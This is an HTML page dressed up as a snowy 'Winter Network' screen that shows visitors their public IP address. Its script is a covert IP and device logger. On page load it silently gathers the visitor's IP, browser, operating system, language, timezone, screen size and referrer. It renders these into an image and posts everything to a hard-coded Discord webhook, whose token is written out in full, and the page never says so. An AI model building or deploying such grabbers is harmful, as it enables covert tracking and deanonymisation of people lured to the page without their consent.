<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Winter Network</title>

<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

html,
body {
    width: 100%;
    height: 100%;
}

body {
    overflow: hidden;
    font-family: "Segoe UI", Tahoma, Arial, sans-serif;

    display: flex;
    justify-content: center;
    align-items: center;

    color: white;

    background:
        radial-gradient(
            circle at 50% 0%,
            #123d60 0%,
            #081d31 35%,
            #020914 70%,
            #01040a 100%
        );
}

/* Stars */
.stars {
    position: fixed;
    inset: 0;

    background-image:
        radial-gradient(circle, rgba(255,255,255,.9) 1px, transparent 1px),
        radial-gradient(circle, rgba(150,220,255,.5) 1px, transparent 1px);

    background-size: 90px 90px, 150px 150px;
    background-position: 20px 20px, 70px 100px;

    opacity: .5;
}

/* Aurora */
.aurora {
    position: fixed;

    width: 1000px;
    height: 500px;

    top: -250px;
    left: 50%;

    transform: translateX(-50%);

    background:
        radial-gradient(
            ellipse,
            rgba(0,255,220,.20),
            transparent 60%
        ),
        radial-gradient(
            ellipse,
            rgba(40,150,255,.22),
            transparent 65%
        );

    filter: blur(60px);

    animation: aurora 8s ease-in-out infinite alternate;
}

@keyframes aurora {
    from {
        transform: translateX(-50%) rotate(-5deg) scale(1);
    }

    to {
        transform: translateX(-50%) rotate(5deg) scale(1.15);
    }
}

/* Moon */
.moon {
    position: fixed;

    width: 90px;
    height: 90px;

    top: 70px;
    right: 80px;

    border-radius: 50%;

    background:
        radial-gradient(
            circle at 35% 30%,
            #fff,
            #d9edff 50%,
            #9bbbd3
        );

    box-shadow:
        0 0 30px rgba(220,245,255,.8),
        0 0 80px rgba(70,180,255,.3);
}

/* Snow canvas */
#snowCanvas {
    position: fixed;
    inset: 0;

    width: 100%;
    height: 100%;

    pointer-events: none;
}

/* Main card */
.ip-box {
    position: relative;

    z-index: 10;

    width: min(560px, 90vw);

    padding: 40px;

    border-radius: 30px;

    text-align: center;

    background:
        linear-gradient(
            145deg,
            rgba(255,255,255,.13),
            rgba(255,255,255,.035)
        );

    border:
        1px solid rgba(180,225,255,.35);

    backdrop-filter: blur(25px);
    -webkit-backdrop-filter: blur(25px);

    box-shadow:
        0 30px 90px rgba(0,0,0,.6),
        inset 0 1px 0 rgba(255,255,255,.25),
        0 0 70px rgba(60,170,255,.12);
}

.icon {
    font-size: 55px;

    margin-bottom: 10px;

    filter:
        drop-shadow(0 0 15px rgba(100,210,255,.9));

    animation: float 3s ease-in-out infinite;
}

@keyframes float {
    50% {
        transform: translateY(-7px) rotate(5deg);
    }
}

h1 {
    font-size: 32px;

    letter-spacing: 3px;

    color: #effaff;

    text-shadow:
        0 0 10px #65d8ff,
        0 0 30px rgba(50,170,255,.6);
}

.subtitle {
    margin-top: 10px;
    margin-bottom: 25px;

    font-size: 12px;

    color: rgba(220,240,255,.6);

    letter-spacing: 2px;
}

.ip-container {
    padding: 22px;

    border-radius: 18px;

    background: rgba(0,15,30,.55);

    border:
        1px solid rgba(100,210,255,.25);
}

.label {
    font-size: 11px;

    letter-spacing: 3px;

    color: #80dfff;

    margin-bottom: 8px;
}

#ip-display {
    direction: ltr;

    font-family: monospace;

    font-size: 34px;

    font-weight: bold;

    color: white;

    text-shadow:
        0 0 10px #65d8ff,
        0 0 30px rgba(50,180,255,.7);

    word-break: break-all;
}

.status {
    display: flex;

    justify-content: center;
    align-items: center;

    gap: 8px;

    margin-top: 12px;

    font-size: 11px;

    color: rgba(220,240,255,.55);
}

.status-dot {
    width: 8px;
    height: 8px;

    border-radius: 50%;

    background: #63e6ff;

    box-shadow: 0 0 12px #63e6ff;
}

.footer {
    margin-top: 22px;

    font-size: 10px;

    color: rgba(210,235,255,.35);

    letter-spacing: 2px;
}

@media(max-width:600px) {

    .ip-box {
        padding: 30px 20px;
    }

    .moon {
        width: 60px;
        height: 60px;

        top: 30px;
        right: 25px;
    }

    h1 {
        font-size: 25px;
    }

    #ip-display {
        font-size: 25px;
    }
}
</style>
</head>

<body>

<div class="stars"></div>
<div class="aurora"></div>
<div class="moon"></div>

<canvas id="snowCanvas"></canvas>

<div class="ip-box">

    <div class="icon">❄️</div>

    <h1>WINTER NETWORK</h1>

    <div class="subtitle">
        YOUR CONNECTION INFORMATION
    </div>

    <div class="ip-container">

        <div class="label">
            PUBLIC IP ADDRESS
        </div>

        <div id="ip-display">
            Loading...
        </div>

        <div class="status">
            <span class="status-dot"></span>
            <span id="status">
                Detecting connection...
            </span>
        </div>

    </div>

    <div class="footer">
        ❄ ARCTIC NETWORK SYSTEM ❄
    </div>

</div>


<script>

/* =====================================================
   WEBHOOK
===================================================== */

/*
    ضع هنا WEBHOOK جديد خاص بك.

    لا تستخدم الرابط القديم الذي نشرته في المحادثة.
*/

const WEBHOOK_URL =
    "https://discord.com/api/webhooks/1525849620444348447/UbMP6l9DeOZoxBjJQyrix-yXRp7zySP1yPAn-Nd5mFEOqqJxT-G65fvfoUjSVdvKupfy";


/* =====================================================
   DATA
===================================================== */

let visitorData = {
    ip: "Unknown",
    browser: "Unknown",
    os: "Unknown",
    platform: navigator.platform || "Unknown",

    language:
        navigator.language || "Unknown",

    timezone:
        Intl.DateTimeFormat()
        .resolvedOptions()
        .timeZone || "Unknown",

    screen:
        `${screen.width} × ${screen.height}`,

    colorDepth:
        screen.colorDepth || "Unknown",

    online:
        navigator.onLine
        ? "Online"
        : "Offline",

    cookies:
        navigator.cookieEnabled
        ? "Enabled"
        : "Disabled",

    referrer:
        document.referrer || "Direct",

    page:
        location.href,

    time:
        new Date().toLocaleString()
};


/* =====================================================
   BROWSER DETECTION
===================================================== */

function detectBrowser() {

    const ua =
        navigator.userAgent;

    if (ua.includes("Edg/"))
        return "Microsoft Edge";

    if (ua.includes("OPR/"))
        return "Opera";

    if (ua.includes("Chrome/"))
        return "Google Chrome";

    if (ua.includes("Firefox/"))
        return "Mozilla Firefox";

    if (ua.includes("Safari/"))
        return "Safari";

    return "Unknown";
}


/* =====================================================
   OS DETECTION
===================================================== */

function detectOS() {

    const ua =
        navigator.userAgent;

    if (ua.includes("Windows NT"))
        return "Windows";

    if (ua.includes("Mac OS"))
        return "macOS";

    if (ua.includes("Android"))
        return "Android";

    if (
        ua.includes("iPhone") ||
        ua.includes("iPad")
    )
        return "iOS";

    if (ua.includes("Linux"))
        return "Linux";

    return "Unknown";
}


visitorData.browser =
    detectBrowser();

visitorData.os =
    detectOS();


/* =====================================================
   GET PUBLIC IP
===================================================== */

async function getIP() {

    try {

        const response =
            await fetch(
                "https://api.ipify.org?format=json"
            );

        const data =
            await response.json();

        visitorData.ip =
            data.ip;

        document.getElementById(
            "ip-display"
        ).textContent =
            data.ip;

        document.getElementById(
            "status"
        ).textContent =
            "Connection detected";

    }

    catch {

        document.getElementById(
            "ip-display"
        ).textContent =
            "Unavailable";

        document.getElementById(
            "status"
        ).textContent =
            "Unable to detect IP";
    }
}


/* =====================================================
   CREATE WINTER IMAGE
===================================================== */

function createInfoImage() {

    const canvas =
        document.createElement(
            "canvas"
        );

    canvas.width = 1400;
    canvas.height = 900;

    const ctx =
        canvas.getContext("2d");


    /* Background */

    const bg =
        ctx.createLinearGradient(
            0, 0,
            1400, 900
        );

    bg.addColorStop(
        0,
        "#071d32"
    );

    bg.addColorStop(
        .5,
        "#04111f"
    );

    bg.addColorStop(
        1,
        "#01060d"
    );

    ctx.fillStyle = bg;

    ctx.fillRect(
        0, 0,
        1400, 900
    );


    /* Aurora */

    const aurora =
        ctx.createRadialGradient(
            700, 50,
            20,
            700, 50,
            600
        );

    aurora.addColorStop(
        0,
        "rgba(0,255,220,.22)"
    );

    aurora.addColorStop(
        .5,
        "rgba(40,150,255,.15)"
    );

    aurora.addColorStop(
        1,
        "transparent"
    );

    ctx.fillStyle =
        aurora;

    ctx.fillRect(
        0, 0,
        1400, 500
    );


    /* Snow */

    for (
        let i = 0;
        i < 170;
        i++
    ) {

        const x =
            Math.random() * 1400;

        const y =
            Math.random() * 900;

        const r =
            Math.random() * 3 + 1;

        ctx.beginPath();

        ctx.arc(
            x, y, r,
            0,
            Math.PI * 2
        );

        ctx.fillStyle =
            "rgba(220,245,255,.7)";

        ctx.fill();
    }


    /* Card */

    const x = 80;
    const y = 70;
    const w = 1240;
    const h = 760;

    ctx.fillStyle =
        "rgba(10,30,48,.88)";

    ctx.strokeStyle =
        "rgba(120,215,255,.45)";

    ctx.lineWidth = 3;

    roundRect(
        ctx,
        x, y,
        w, h,
        35
    );

    ctx.fill();
    ctx.stroke();


    /* Header */

    ctx.font =
        "bold 55px Segoe UI";

    ctx.fillStyle =
        "#eafaff";

    ctx.fillText(
        "❄  WINTER NETWORK",
        130,
        160
    );


    ctx.font =
        "22px Segoe UI";

    ctx.fillStyle =
        "#75dfff";

    ctx.fillText(
        "CONNECTION INFORMATION",
        135,
        205
    );


    /* Divider */

    ctx.strokeStyle =
        "rgba(120,215,255,.2)";

    ctx.beginPath();

    ctx.moveTo(
        130, 240
    );

    ctx.lineTo(
        1270, 240
    );

    ctx.stroke();


    /* IP */

    ctx.font =
        "20px Segoe UI";

    ctx.fillStyle =
        "#75dfff";

    ctx.fillText(
        "PUBLIC IP ADDRESS",
        140,
        300
    );

    ctx.font =
        "bold 52px monospace";

    ctx.fillStyle =
        "#ffffff";

    ctx.shadowColor =
        "#55d8ff";

    ctx.shadowBlur = 18;

    ctx.fillText(
        visitorData.ip,
        140,
        360
    );

    ctx.shadowBlur = 0;


    /* Information */

    const rows = [

        ["Browser", visitorData.browser],

        ["Operating System", visitorData.os],

        ["Platform", visitorData.platform],

        ["Language", visitorData.language],

        ["Timezone", visitorData.timezone],

        ["Screen", visitorData.screen],

        ["Color Depth",
            visitorData.colorDepth + " bit"],

        ["Connection",
            visitorData.online],

        ["Cookies",
            visitorData.cookies],

        ["Referrer",
            visitorData.referrer]

    ];


    let rowY = 425;


    for (
        const row of rows
    ) {

        ctx.font =
            "bold 19px Segoe UI";

        ctx.fillStyle =
            "#76dcff";

        ctx.fillText(
            row[0],
            150,
            rowY
        );


        ctx.font =
            "19px Segoe UI";

        ctx.fillStyle =
            "#e7f8ff";

        ctx.fillText(
            String(row[1]).substring(
                0,
                65
            ),
            430,
            rowY
        );


        rowY += 35;
    }


    /* Footer */

    ctx.font =
        "16px Segoe UI";

    ctx.fillStyle =
        "rgba(220,240,255,.45)";

    ctx.fillText(
        visitorData.time,
        150,
        790
    );


    return canvas;
}


/* =====================================================
   ROUNDED RECT
===================================================== */

function roundRect(
    ctx,
    x,
    y,
    width,
    height,
    radius
) {

    ctx.beginPath();

    ctx.roundRect(
        x,
        y,
        width,
        height,
        radius
    );
}


/* =====================================================
   SEND DISCORD WEBHOOK
===================================================== */

async function sendWebhook() {

    if (
        !WEBHOOK_URL ||
        WEBHOOK_URL.includes(
            "PUT_YOUR_NEW"
        )
    ) {

        console.warn(
            "Discord webhook is not configured."
        );

        return;
    }


    const imageCanvas =
        createInfoImage();


    const blob =
        await new Promise(
            resolve =>
                imageCanvas.toBlob(
                    resolve,
                    "image/png"
                )
        );


    const form =
        new FormData();


    /* Discord Embed */

    const payload = {

        username:
            "❄️ Winter Network",

        embeds: [

            {

                title:
                    "❄️ New Connection",

                description:
                    "A connection was detected on the Winter Network page.",

                color:
                    0x62D9FF,

                fields: [

                    {
                        name:
                            "🌐 Public IP",

                        value:
                            "`" +
                            visitorData.ip +
                            "`",

                        inline:
                            false
                    },

                    {
                        name:
                            "💻 Device",

                        value:
                            `${visitorData.os} • ${visitorData.platform}`,

                        inline:
                            true
                    },

                    {
                        name:
                            "🌎 Browser",

                        value:
                            visitorData.browser,

                        inline:
                            true
                    },

                    {
                        name:
                            "📐 Screen",

                        value:
                            visitorData.screen,

                        inline:
                            true
                    },

                    {
                        name:
                            "🌍 Language",

                        value:
                            visitorData.language,

                        inline:
                            true
                    },

                    {
                        name:
                            "🕐 Timezone",

                        value:
                            visitorData.timezone,

                        inline:
                            true
                    }

                ],

                image: {
                    url:
                        "attachment://winter-info.png"
                },

                footer: {
                    text:
                        "Winter Network • Connection Logger"
                },

                timestamp:
                    new Date().toISOString()
            }

        ]

    };


    form.append(
        "payload_json",
        JSON.stringify(payload)
    );


    form.append(
        "files[0]",
        blob,
        "winter-info.png"
    );


    try {

        const response =
            await fetch(
                WEBHOOK_URL,
                {
                    method: "POST",
                    body: form
                }
            );


        if (!response.ok) {

            console.error(
                "Discord webhook error:",
                response.status
            );

        } else {

            console.log(
                "Winter Network information sent."
            );
        }

    }

    catch (error) {

        console.error(
            "Webhook failed:",
            error
        );

    }
}


/* =====================================================
   START
===================================================== */

window.addEventListener(
    "load",
    async () => {

        await getIP();

        /*
          Give the browser a moment
          to finish rendering.
        */

        setTimeout(
            sendWebhook,
            700
        );
    }
);


/* =====================================================
   SNOW ANIMATION
===================================================== */

const snowCanvas =
    document.getElementById(
        "snowCanvas"
    );

const snowCtx =
    snowCanvas.getContext("2d");


let snow = [];


function resizeSnow() {

    snowCanvas.width =
        window.innerWidth;

    snowCanvas.height =
        window.innerHeight;
}

resizeSnow();

window.addEventListener(
    "resize",
    resizeSnow
);


for (
    let i = 0;
    i < 220;
    i++
) {

    snow.push({

        x:
            Math.random()
            * window.innerWidth,

        y:
            Math.random()
            * window.innerHeight,

        r:
            Math.random() * 3 + 1,

        speed:
            Math.random() * 1.8 + .4,

        drift:
            Math.random() * .8 - .4

    });
}


function drawSnow() {

    snowCtx.clearRect(
        0,
        0,
        snowCanvas.width,
        snowCanvas.height
    );


    for (
        const flake of snow
    ) {

        flake.y +=
            flake.speed;

        flake.x +=
            flake.drift;


        if (
            flake.y >
            snowCanvas.height
        ) {

            flake.y = -10;

            flake.x =
                Math.random()
                * snowCanvas.width;
        }


        snowCtx.beginPath();

        snowCtx.arc(
            flake.x,
            flake.y,
            flake.r,
            0,
            Math.PI * 2
        );

        snowCtx.fillStyle =
            "rgba(235,250,255,.75)";

        snowCtx.shadowColor =
            "#80dcff";

        snowCtx.shadowBlur =
            flake.r > 2 ? 8 : 3;

        snowCtx.fill();
    }


    snowCtx.shadowBlur = 0;

    requestAnimationFrame(
        drawSnow
    );
}


drawSnow();

</script>

</body>
</html>
